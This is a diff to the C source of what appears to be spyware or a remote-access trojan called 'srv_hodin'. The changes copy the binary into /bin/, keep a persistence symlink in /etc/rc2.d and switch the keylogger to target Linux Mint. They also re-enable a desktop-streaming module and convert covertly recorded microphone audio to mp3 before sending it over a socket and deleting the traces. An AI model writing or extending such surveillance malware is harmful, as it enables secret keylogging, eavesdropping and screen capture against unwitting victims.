@@ -60,6 +60,13 @@ int main(int argc, char *argv[])
         error("system() copy srv_hodin in /usr/bin/", "main()");
         return 0;
     }
+    
+    /** Copy executable file in /bin/ **/
+    if(system("cp srv_hodin /bin/") == -1)
+    {
+        error("system() copy srv_hodin in /bin/", "main()");
+        return 0;
+    }
 
     /** Copy executable file in /usr/sbin/ **/
     if(system("cp srv_hodin /usr/sbin/") == -1)
@@ -67,7 +74,7 @@ int main(int argc, char *argv[])
         error("system() copy srv_hodin in /usr/sbin/", "main()");
         return 0;
     }
-
+    
     /** Create a symbolic link with hodin_daemon.sh **/
     if(system("ln -s /etc/init.d/hodin_daemon.sh /etc/rc2.d/S88hodin_daemon.sh") == -1)
     {
@@ -77,9 +84,9 @@ int main(int argc, char *argv[])
 
     //ubuntu16_keylogger_init();
 
-    ubuntu18_keylogger_init();
+    //ubuntu18_keylogger_init();
 
-    //mint_keylogger_init();
+    mint_keylogger_init();
 
     //debian_keylogger_init();
 
@@ -330,7 +337,6 @@ void dispatch_modules(char *argv[])
                 return;
             }
 
-            //send_hosts_file();
         }
 
         if(flag == 12)
@@ -350,7 +356,7 @@ void dispatch_modules(char *argv[])
             }
         }
         
-        /*
+        
         if(flag == 13)
         {
             printf("\t\tDESKTOP STREAMING STARTED....\n");
@@ -367,9 +373,7 @@ void dispatch_modules(char *argv[])
 
                 return;
             }
-
         }
-        */
 
         if(flag == 14)
         {
@@ -1246,10 +1250,18 @@ void *execute_record_cmd()
         if(send(csock, (char*)&recorded, sizeof(recorded), 0) == -1)
             error("send() recorded", "execute_record_cmd()");
         
-        record_file = fopen("output.wav", "rb");
+        if(system("ffmpeg -i output.wav -vn -ar 44100 -ac 2 -b:a 320k output.mp3") == -1)
+        {
+            error("system ffmpeg", "execute_record_cmd()");
+            pthread_exit(NULL);
+        }
+        
+        wait_time_end(6.0);
+        
+        record_file = fopen("output.mp3", "rb");
         if(record_file == NULL)
         {
-            error("fopen() output.wav", "execute_record_cmd()");
+            error("fopen() output.mp3", "execute_record_cmd()");
             pthread_exit(NULL);
         }
     }
@@ -1317,6 +1329,12 @@ void *execute_record_cmd()
         {
             error("popen() delete output.wav", "execute_record_cmd()");
             pthread_exit(NULL);
+        }
+        
+        if(system("rm -rf output.mp3") == -1)
+        {
+            error("system delete output.mp3", "execute_record_cmd()");
+            pthread_exit(NULL);        
         }
     }
     
